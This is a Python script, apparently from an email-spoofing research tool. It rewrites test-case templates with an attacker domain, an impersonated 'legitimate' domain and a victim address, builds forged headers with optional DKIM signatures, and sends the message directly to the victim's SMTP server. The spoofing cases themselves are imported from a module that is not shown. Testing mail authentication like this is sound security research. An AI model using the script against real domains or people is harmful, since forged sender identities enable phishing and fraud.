from common.common import *
from common.mailsender import mailsender

import testcases

config = {
	"attacker_site": b"owlhut.com",
	"legitimate_site": b"b.cdnsec.tk",
	"victim_address": b"admin@jianjunchen.com",
	"case_id": b"case_a3",
}

def fixup_test_case_data(t):
	t = recursive_fixup(t, b"attack.com", config["attacker_site"])
	t = recursive_fixup(t, b"legitimate.com", config["legitimate_site"])
	t= recursive_fixup(t, b"victim@victim.com", config["victim_address"])
	return t

test_cases = fixup_test_case_data(testcases.test_cases)

def build_email(case_id):	
	msg_content = test_cases[case_id]["data"]
	dkim_para = test_cases[case_id].get("dkim_para")
	if dkim_para != None:
		dkim_msg =   dkim_para["sign_header"] +b"\r\n\r\n" + msg_content["body"]
		dkim_header = generate_dkim_header(dkim_msg, dkim_para)
		msg = msg_content["from_header"] + dkim_header + msg_content["to_header"] + msg_content["subject_header"] + msg_content["other_headers"] + msg_content["body"]
	else:
		msg = msg_content["from_header"] + msg_content["to_header"] + msg_content["subject_header"] + msg_content["other_headers"] + msg_content["body"]
	return msg

def build_smtp_seqs(case_id):
	cmd_seqs = {
		"helo": test_cases[case_id]["helo"],
		"mailfrom": test_cases[case_id]["mailfrom"],
		"rcptto": test_cases[case_id]["rcptto"],
		"msg_content": build_email(case_id)
	}
	return cmd_seqs

def main():
	cmd_seqs = build_smtp_seqs(config["case_id"].decode("utf-8"))
	mail_server = get_mail_server_from_email(config["victim_address"])
	mail_sender = mailsender()
	mail_sender.set_param((mail_server, 25), rcpt_to = cmd_seqs["rcptto"], email_data = cmd_seqs["msg_content"], helo=cmd_seqs["helo"], mail_from= cmd_seqs["mailfrom"], starttls=True)
	mail_sender.send_email()

if __name__ == '__main__':
	main()



